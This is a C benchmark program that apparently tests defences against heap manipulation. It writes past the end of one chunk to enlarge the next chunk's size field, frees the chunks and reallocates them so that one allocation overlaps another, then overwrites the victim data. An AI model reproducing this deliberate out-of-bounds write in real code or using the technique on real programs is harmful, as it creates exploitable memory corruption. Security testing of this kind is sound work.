/*  
 * Benchmark: Heap Manipulation
 *
 * This vulnerability demonstrates a heap manipulation exploit. It involves 
 * first using an out of bounds write to make the range of one chunk extend 
 * past the range of a formally subsequent chunk. Thus the memory range of the 
 * second chunk would be inside the range of the first. These chunks are then 
 * feed and reallocated. Thus any edit made on the larger chunk would be legal, 
 * regardless of whether the memory written to or read from was within the space 
 * of the smaller chunk.
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){

  // Allocate memory for c, d, and e
  char* c = malloc(0x10);   // 0    // 00000000 00000000
  char* d = malloc(0x10);   // 16   // 00000000 00000000
  char* e = malloc(0x10);   // 32   // 00000000 00000000

  // Initialize c, d, and e with 'Z'
  // memset(c, 'Z', 0x10);     // 0x5A == 'Z'    
  // memset(d, 'Z', 0x10);     
  // memset(e, 'Z', 0x10);     
 
  // Print what is stored a the memory location of c, d, and e
  printf("c: %s\n", c);
  printf("d: %s\n", d);
  printf("e: %s\n", e);

  // Manually edit size of d to a larger size so that it overlaps with e
  *(c+0x18) = 0x61; 
  
  // Print every byte of the memory allocated to c
  // for(int i = 0; i < 0x20; i++){
  //   printf("c[%d]: %x\n", i, c[i]);
  // }

  free(d); //Free d for a reallocation
  free(e); //Free e for a reallocation

  /* 
    If a malloc is done for h with the size of e and for g with the adjusted size of d, 
    and is successful, then the memory allocated to h would be a subset of the memory
    allocated to g. Thus g would be able to legally control the contents of the memory 
    allocated to h
  */
  
  char* g = malloc(0x50); //Allocate a new variable with the increased size
  char* h = malloc(0x10); 
  
  // If the exploit succeeded, then d and g will be the same, otherwise d and h will be the same
  
  // h copies in some data needed for program control
  memcpy(h, "victim's data", 0xe); 
  
  // This position is still within the legal memory range of g but the memory region overlaps with h
  memset(g+0x20, 0x41, 0xf); 

  printf("d: %#p\n", d);
  printf("e: %#p\n\n", e);

  printf("g: %#p -> %#p\n", g, (g+0x50));
  printf("h: %#p\n", h);
  printf("h: %s\n", h);

  if(h[0] == 'A')
    printf("\nTest Failed: Heap manipulation leading to overlapping memory regions\n");
  else
    printf("\nTest Passed: Heap manipulation unsuccesful!\n");

  return 0;
}